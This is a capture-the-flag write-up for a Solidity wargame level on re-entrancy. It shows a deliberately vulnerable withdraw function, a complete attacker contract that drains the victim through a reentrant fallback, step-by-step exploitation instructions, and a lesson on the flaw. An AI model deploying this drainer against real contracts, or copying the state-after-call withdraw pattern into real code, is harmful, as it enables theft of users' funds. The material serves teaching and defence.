# Re-entrancy
_difficulty 6/10_

The goal of this level is for you to steal all the funds from the contract.  


Things that might help:  
- Untrusted contracts can execute code where you least expect it.  
- Fallback methods  
- Throw/revert bubbling  
- Sometimes the best way to attack a contract is with another contract.  
- See the Help page above, section "Beyond the console"

```javascript
pragma solidity ^0.4.18;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

## Re-entrancy solution

1. Get current contract address.  
`contract.address`  

2. Using Remix, deploy `ReentrancyAttacker.sol` with current contract address as a parameter.  
```javascript
pragma solidity ^0.4.18;

contract ReentrancyAttacker {
  Reentrance _reentrance;
  uint256 _donated;
  address _thief;

  function ReentrancyAttacker(address reentrance) public payable {
    _reentrance = Reentrance(reentrance);
    _thief = msg.sender;
    _donated = msg.value;
    _reentrance.donate.value(msg.value)(address(this));
  }

  function payday() public {
    uint256 balance = address(this).balance;
    _thief.transfer(balance);
  }

  function withdraw() public payable {
    _reentrance.withdraw(_donated);
  }

  function() public payable {
    uint256 balance = _reentrance.balance;
    if (balance > 0) {
      if (_donated > balance) {
        _reentrance.withdraw(balance);
      } else {
        _reentrance.withdraw(_donated);
      }
    }
  }
}
```

3. Donate 1Eth to the address of the `ReentrancyAttacker` contract.  

4. Call the `withdraw` function. This function will withdraw the donated Ether. The `Reentrancy` contract will try to send Ether to the calling contract address and will invoke the payable fallback function that will attempt to withdraw again, until all funds are stolen.  

5. Check `Reentrancy` contract balance.  
`fromWei(await getBalance(contract.address))`  
0  

5. Call the `payday` function to get Eth from the `ReentrancyAttacker` contract so it's not stuck there forever.  

6. Submit instance ðŸŽ‰  

## Lesson

Use transfer to move funds out of your contract, since it throws and limits gas forwarded. Low level functions like call and send just return false but don't interrupt the execution flow when the receiving contract fails.  
Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.  
Re-entrancy is a common attack. You should always be prepared for it!  
 
__The DAO Hack__  
The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942).
